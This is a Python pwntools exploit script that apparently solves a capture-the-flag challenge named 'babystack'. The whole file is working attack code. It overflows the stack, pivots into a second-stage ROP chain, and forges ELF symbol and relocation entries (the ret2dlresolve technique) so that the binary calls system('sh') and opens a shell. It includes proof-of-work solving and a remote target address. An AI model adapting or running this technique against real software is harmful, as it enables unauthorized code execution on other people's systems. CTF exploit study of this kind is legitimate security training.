
from pwn import *

elf = ELF("babystack")

# an arbitrary rw location we can use to store our stage2 payload
STAGE2_ADDR = 0x0804ac00
GADGET_LEAVE = 0x080483a8  # leave; ret;

PLT = elf.get_section_by_name(".plt")["sh_addr"]
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag,
    ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

log.info("PLT:    " + hex(PLT))
log.info("STRTAB: " + hex(STRTAB))
log.info("SYMTAB: " + hex(SYMTAB))
log.info("JMPREL: " + hex(JMPREL))

# stage1 = "A"*40
# stage1 += p32(STAGE2_ADDR-4)  # saved ebp
# # ROP ENTRYPOINT:
# stage1 += p32(elf.plt["read"])  # read(stdin, stage2, 0x100-0x40)
# stage1 += p32(GADGET_LEAVE)  # jump into stage2 ROP
# stage1 += p32(0)  # stdin
# stage1 += p32(STAGE2_ADDR)
# stage1 += p32(0x100-0x40)  # length

stage1 = flat(["A"*40,STAGE2_ADDR-4,elf.plt["read"],GADGET_LEAVE,0,STAGE2_ADDR,0x100-0x40])

# hand-written ROP because we're tight on space.
# no padding needed!
assert(len(stage1) == 0x40)

# placeholder for ROP, will be inserted later once we know some offsets
stage2_1 = p32(0)*4

# start with some strings we'll need to reference later
stage2_cmd_str = len(stage2_1)
stage2_2 = "sh\0"
# ^^^ It'd be more sensible to put this on the end of the payload, but I kinda
# wanted to show off how flexible my payload generation is - you can change the
# cmd length without anything breaking
stage2_system_str = len(stage2_1)+len(stage2_2)
stage2_3 = "system\0"

# 16 byte align, relative to SYMTAB
stage2_4= "A"*((SYMTAB-(len(stage2_1)+len(stage2_2)+len(stage2_3)))%16)
assert((len(stage2_1)+len(stage2_2)+len(stage2_3)+len(stage2_4)+STAGE2_ADDR-SYMTAB)%16 == 0)  # sanity check, alignment is hard

# Fake Elf32_Sym
stage2_fake_sym = len(stage2_1)+len(stage2_2)+len(stage2_3)+len(stage2_4)
stage2_5 = p32(STAGE2_ADDR+stage2_system_str-STRTAB)  # index of "system" in strtab
stage2_6 = p32(0x33333333)  # st_value (unused)
stage2_7 = p32(0x44444444)  # st_size (unused)
stage2_8 = p32(0)  # st_other & 3 must be 0

# Fake Elf32_Rel
stage2_fake_rel = len(stage2_1)+len(stage2_2)+len(stage2_3)+len(stage2_4)+len(stage2_5)+len(stage2_6)+len(stage2_7)+len(stage2_8)
stage2_9 = p32(STAGE2_ADDR+0x100) # arbitrary writable address
r_info = ((stage2_fake_sym+STAGE2_ADDR-SYMTAB)//16)
r_info = (r_info << 8) | 7
stage2_10 = p32(r_info) # offset of fake sym, reloc type 7=R_386_JMP_SLOT

# stage2 ROP payload
# stage2_rop = ""
# stage2_rop += p32(PLT)  # plt start
# stage2_rop += p32(STAGE2_ADDR+stage2_fake_rel-JMPREL)  # reloc_offset
# stage2_rop += p32(0xdeadbeef)  # only reached after system()
# stage2_rop += p32(STAGE2_ADDR+stage2_cmd_str)  # argument to system()

stage2_rop = flat([p32(PLT),STAGE2_ADDR+stage2_fake_rel-JMPREL,0xdeadbeef,STAGE2_ADDR+stage2_cmd_str])
# Actually insert the ROP into the payload
stage2 = flat([stage2_1,stage2_2,stage2_3,stage2_4,stage2_5,stage2_6,stage2_7,stage2_8,stage2_9,stage2_10])
stage2 = flat(stage2_rop , stage2[len(stage2_rop):])

payload = stage1 + stage2
log.info(hex(len(payload)) + "/0x100 bytes used.")
payload = flat(payload,"A"*(0x100-len(payload))) # pad to 0x100 bytes

TESTING = True

if TESTING:
    babystack = process("./babystack")
else:
    babystack = remote("202.120.7.202", 6666)
    #babystack = process(["python2", "pow.py"])
    chal = babystack.recvline().strip()
    log.info("Calculating PoW for " + chal)
    sol = 0
    while not sha256sum(chal+p32(sol)).startswith("\0\0\0"):
        sol += 1
    babystack.send(p32(sol))

babystack.send(payload)
babystack.interactive()